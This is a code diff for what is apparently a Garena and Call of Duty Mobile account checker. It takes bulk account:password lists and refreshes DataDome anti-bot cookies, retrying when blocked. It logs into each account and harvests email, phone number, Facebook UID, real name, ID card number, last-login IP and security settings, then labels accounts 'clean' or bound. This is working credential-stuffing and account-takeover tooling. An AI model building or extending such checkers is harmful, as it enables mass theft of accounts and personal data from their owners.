@@ -509,15 +807,43 @@ function parseAccountDetails(data: Record<string, unknown>): Record<string, unkn
     nickname: userInfo.nickname || 'N/A',
     email: email,
     email_verified: emailVerified,
-    country: userInfo.acc_country || 'N/A',
+    country: accCountry,
+    country_code: countryCode,
     shell_balance: userInfo.shell || 0,
     mobile_no: mobileNo || 'N/A',
+    mobile_bound: mobileNo && mobileNo.trim() ? 'Yes' : 'No',
     is_clean: isClean,
-    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ')})`,
-    two_step_verify: Boolean(userInfo.two_step_verify_enable),
-    authenticator: Boolean(userInfo.authenticator_enable),
-    facebook_connected: fbConnected
+    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ') || 'Email Verified'})`,
+    binds: binds,
+    two_step_verify: twoStepVerify,
+    authenticator: authenticator,
+    suspicious: suspicious,
+    security_status: securityIndicators.length === 0 ? 'Normal' : securityIndicators.join(' | '),
+    facebook_connected: fbConnected,
+    facebook_linked: fbLinked,
+    facebook_profile: fbProfile,
+    facebook_uid: fbUid,
+    avatar: userInfo.avatar || 'N/A',
+    password_strength: userInfo.password_s || 'N/A',
+    ip_address: (data.init_ip as string) || lastLoginIp || 'N/A',
+    ip_country: (data.country as string) || 'N/A',
+    last_login: lastLogin,
+    last_login_where: lastLoginWhere,
+    account_status: (userInfo.status as number) === 1 ? 'Active' : 'Inactive',
+    real_name: userInfo.realname || 'N/A',
+    id_card: idCard || 'N/A',
   };
+}
+
+// Check if CODM info is invalid - matching v7.py is_codm_invalid()
+function isCodmInvalid(info: Record<string, unknown> | null): boolean {
+  if (!info) return true;
+  const invalidValues = ['', 'N/A', 'NONE', 'NULL', 'ERROR'];
+  const allInvalid = Object.values(info).every(v => invalidValues.includes(String(v).trim().toUpperCase()));
+  if (allInvalid) return true;
+  const nickname = String(info.codm_nickname || '').trim().toUpperCase();
+  if (invalidValues.includes(nickname)) return true;
+  return false;
 }
 
 // Main check account function with retry logic
@@ -532,13 +858,13 @@ async function checkAccount(account: string, password: string): Promise<Record<s
     }
     
     try {
-      // Step 1: Get fresh DataDome cookie for each attempt
+      // Step 1: Get fresh DataDome cookie
       const datadome = await getDataDomeCookie();
       if (!datadome) {
         lastError = 'Failed to get DataDome cookie';
         console.log('[CHECK] Failed to get DataDome, will retry...');
         if (attempt < RETRY_CONFIG.maxRetries) {
-          await delay(attempt);
+          await retryDelay(attempt);
           continue;
         }
         return {
@@ -550,14 +876,13 @@ async function checkAccount(account: string, password: string): Promise<Record<s
         };
       }
       
-      // Step 2: Prelogin with DataDome check
+      // Step 2: Prelogin with internal retry on 403
       const preloginResult = await prelogin(account, datadome);
       if (!preloginResult) {
-        // Check if this was a DataDome block (403) - retry if so
         lastError = 'Account not found or DataDome blocked';
         console.log('[CHECK] Prelogin failed, checking if retryable...');
         if (attempt < RETRY_CONFIG.maxRetries) {
-          await delay(attempt);
+          await retryDelay(attempt);
           continue;
         }
         return {
@@ -568,12 +893,14 @@ async function checkAccount(account: string, password: string): Promise<Record<s
           retryAttempts: attempt + 1
         };
       }
+      
+      // Use updated datadome if prelogin returned one
+      const activeDatdome = preloginResult.newDatadome || datadome;
 
       // Step 3: Login
-      const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, datadome);
+      const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, activeDatdome);
       if ('error' in loginResult) {
-        // Login errors are not retryable (wrong password, etc)
-        console.log('[CHECK] Login failed (not retryable):', loginResult.error);
+        console.log('[CHECK] Login failed:', loginResult.error);
         return {
           account, password,
           status: 'invalid',
@@ -586,19 +913,19 @@ async function checkAccount(account: string, password: string): Promise<Record<s
       console.log('[CHECK] Login SUCCESS!');
       
       // Step 4: Get account info
-      const accountData = await getAccountInfo(loginResult.ssoKey, datadome);
+      const accountData = await getAccountInfo(loginResult.ssoKey, activeDatdome);
       const details = accountData ? parseAccountDetails(accountData) : { is_clean: false };
 
-      // Step 5: Check CODM
+      // Step 5: Check CODM using new OAuth flow (matching v7.py)
       let hasCodm = false;
       let codmInfo: Record<string, unknown> = {};
       
-      const codmToken = await getCodmAccessToken(loginResult.ssoKey);
-      if (codmToken) {
-        const callbackResult = await processCodmCallback(codmToken);
+      const codmTokenResult = await getCodmAccessToken(loginResult.ssoKey, activeDatdome);
+      if (codmTokenResult) {
+        const callbackResult = await processCodmCallback(codmTokenResult.accessToken);
         if (callbackResult.status === 'success' && callbackResult.token) {
           const codmUser = await getCodmUserInfo(callbackResult.token);
-          if (codmUser) {
+          if (codmUser && !isCodmInvalid(codmUser)) {
             hasCodm = true;
             codmInfo = codmUser;
           }
@@ -622,13 +949,12 @@ async function checkAccount(account: string, password: string): Promise<Record<s
       console.error(`[CHECK] Error on attempt ${attempt + 1}:`, lastError);
       
       if (attempt < RETRY_CONFIG.maxRetries) {
-        await delay(attempt);
+        await retryDelay(attempt);
         continue;
       }
     }
   }
   
-  // All retries exhausted
   console.error('[CHECK] All retries exhausted for:', account);
   return {
     account, password,
@@ -639,7 +965,7 @@ async function checkAccount(account: string, password: string): Promise<Record<s
   };
 }
 
-// Input validation for accounts
+// Input validation
 interface ValidationResult {
   valid: boolean;
   errors: string[];
@@ -676,7 +1002,6 @@ function validateAccountInput(accounts: unknown): ValidationResult {
       continue;
     }
     
-    // Only allow printable ASCII characters
     if (!/^[\x20-\x7E]+$/.test(line)) {
       errors.push(`Account ${i + 1}: contains invalid characters`);
       continue;
@@ -694,9 +1019,6 @@ function validateAccountInput(accounts: unknown): ValidationResult {
       continue;
     }
     
-    // Allow both username and email format (Garena supports both)
-    // Username: alphanumeric with some special chars, no spaces
-    // Email: standard email format
     const isValidUsername = /^[a-zA-Z0-9._-]+$/.test(account);
     const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(account);
     
@@ -734,9 +1056,8 @@ serve(async (req) => {
       );
     }
 
-    // Parse body with size limit check
     const contentLength = parseInt(req.headers.get('content-length') || '0');
-    if (contentLength > 50000) { // 50KB max
+    if (contentLength > 50000) {
       return new Response(
         JSON.stringify({ error: 'Request body too large' }),
         { status: 413, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
@@ -745,7 +1066,6 @@ serve(async (req) => {
 
     const { accounts } = await req.json();
 
-    // Validate input
     const validation = validateAccountInput(accounts);
     if (!validation.valid) {
       return new Response(
